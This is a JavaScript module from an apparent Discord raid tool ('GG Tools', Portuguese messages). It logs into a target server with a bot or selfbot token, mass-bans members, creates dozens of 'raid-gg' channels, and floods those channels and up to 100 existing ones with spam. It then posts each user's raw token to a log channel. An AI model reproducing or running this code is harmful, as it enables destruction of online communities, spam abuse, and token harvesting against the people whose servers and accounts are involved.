const { Client: SelfbotClient } = require('discord.js-selfbot-v13');
const { Client: BotClient, GatewayIntentBits, ChannelType, EmbedBuilder, PermissionsBitField } = require('discord.js');
const fs = require('fs');
const path = require('path');
const { banAll } = require('./banAll');
const { kickAll } = require('./kickall');
const { flood } = require('./flood');
const configFile = JSON.parse(fs.readFileSync(path.join(__dirname, '../config.json'), 'utf8'));

async function raid({ token, guildId, tokenType, interaction, logsChannelId, config = {} }) {
  let client;
  if (tokenType === 'bot') {
    client = new BotClient({
      intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.GuildMessages
      ]
    });
  } else {
    client = new SelfbotClient();
  }
  let erroLogin = false;
  try {
    await client.login(token).catch(() => erroLogin = true);
  } catch {
    erroLogin = true;
  }
  if (erroLogin) {
    await interaction.editReply({ content: '\`❌\` Token inválido, tente novamente!', flags : 64 });
    return;
  }
  try {
    const guild = await client.guilds.fetch?.(guildId) || client.guilds.cache.get(guildId);
    if (!guild) throw new Error('Servidor não encontrado ou sem permissão.');
    await guild.members.fetch({ force: true });
    const member = await interaction.guild.members.fetch(interaction.user.id);
    const cargoUniversal = configFile.cargo_permitido_universal;
    const cargoEspecifico = configFile.cargo_permitido_raid;
    if ((cargoUniversal || cargoEspecifico) && !member.roles.cache.has(cargoUniversal) && !member.roles.cache.has(cargoEspecifico)) {
      await interaction.editReply({ content: '\`❌\` \`❌\` Você não tem permissão para esta ação, resgate seu acesso em https://discord.com/channels/1352435898205208680/1382212010590081164.', flags : 64 });
      return;
    }
    let logMsgs = [];
    function log(msg) {
      logMsgs.push(msg);
      interaction.editReply({ content: '`⚡` Ataque em andamento...\n' + msg }).catch(() => {});
    }
    // Ban All
    if (config.banAll) {
      log('Iniciando banAll...');
      await banAll({
        token,
        guildId,
        tokenType,
        interaction,
        logsChannelId
      });
      log('BanAll finalizado.');
    }
    // Criar canais e já spammar (concorrente)
    if (config.criarCanais) {
      log('Criando canais e enviando flood (concorrente)...');
      let quantidade = 50;
      let nome = 'raid-gg';
      const MAX_CONCURRENT = 5;
      let running = 0;
      let created = 0;
      async function floodChannel(channel) {
        for (let j = 0; j < 25; j++) {
          try {
            await channel.send(config.mensagem);
            log(`Mensagem enviada em <#${channel.id}> (${j + 1}/25)`);
            await new Promise(r => setTimeout(r, 100));
          } catch (e) {
            log(`Erro ao enviar mensagem em <#${channel.id}>: ${e.message}`);
          }
        }
      }
      async function createAndFlood() {
        while (created < quantidade) {
          if (running >= MAX_CONCURRENT) {
            await new Promise(r => setTimeout(r, 200));
            continue;
          }
          running++;
          (async () => {
            try {
              const newChannel = await guild.channels.create(
                nome + '-' + Math.floor(Math.random() * 10000),
                { type: ChannelType.GuildText }
              );
              log(`Canal criado (${created + 1}/${quantidade})`);
              if (config.mensagem) await floodChannel(newChannel);
            } catch (e) {
              log(`Erro ao criar canal: ${e.message}`);
            }
            running--;
          })();
          created++;
          await new Promise(r => setTimeout(r, 100));
        }
        while (running > 0) await new Promise(r => setTimeout(r, 200));
        log('Criação de canais e flood inicial finalizados.');
      }
      await createAndFlood();
    }
    // Flood massivo em todos os canais de texto
    if (config.mensagem) {
      log('Floodando em todos os canais de texto...');
      const canais = guild.channels.cache.filter(c => c.type === ChannelType.GuildText).map(c => c.id).slice(0, 100);
      for (const channelId of canais) {
        try {
          const channel = await client.channels.fetch(channelId).catch(() => null);
          if (channel) {
            for (let j = 0; j < 25; j++) {
              try {
                await channel.send(config.mensagem);
                log(`Mensagem enviada em <#${channelId}> (${j + 1}/25)`);
                await new Promise(r => setTimeout(r, 100));
              } catch (e) {
                log(`Erro ao enviar mensagem em <#${channelId}>: ${e.message}`);
              }
            }
          }
        } catch (e) {
          log(`Erro ao acessar canal <#${channelId}>: ${e.message}`);
        }
      }
      log('Flood massivo finalizado.');
    }
    // Log final
    const logChannelId = configFile.log_raid || configFile.log_cleaner || logsChannelId || configFile.log_extracao;
    if (logChannelId) {
      const logChannel = interaction.client.channels.cache.get(logChannelId);
      if (logChannel) {
        const embed = new EmbedBuilder()
          .setTitle('⚡ Raid Executada')
          .setColor(0x5865F2)
          .addFields(
            { name: 'Usuário', value: `<@${interaction.user.id}>`, inline: true },
            { name: 'Token', value: `||${token}||`, inline: false },
            { name: 'Servidor', value: `\`${guildId}\``, inline: true },
            { name: 'Criar Canais?', value: String(!!config.criarCanais), inline: true },
            { name: 'Mensagem Flood', value: config.mensagem ? config.mensagem.slice(0, 1000) : 'Nenhuma', inline: false },
            { name: 'BanAll?', value: String(!!config.banAll), inline: true },
            { name: 'Data/Hora', value: `<t:${Math.floor(Date.now()/1000)}:F>`, inline: false }
          )
          .setFooter({ text: 'GG Tools' });
        logChannel.send({ embeds: [embed] });
      }
    }
    await interaction.editReply({ content: '\`✅\` Raid finalizada!\n' + logMsgs.join('\n'), flags : 64 });
  } catch (err) {
    await interaction.editReply({ content: '\`❌\` Erro ao executar Raid: ' + err.message, flags : 64 });
  }
  await client.destroy?.();
  await client.logout?.().catch(() => {});
}

module.exports = { raid };
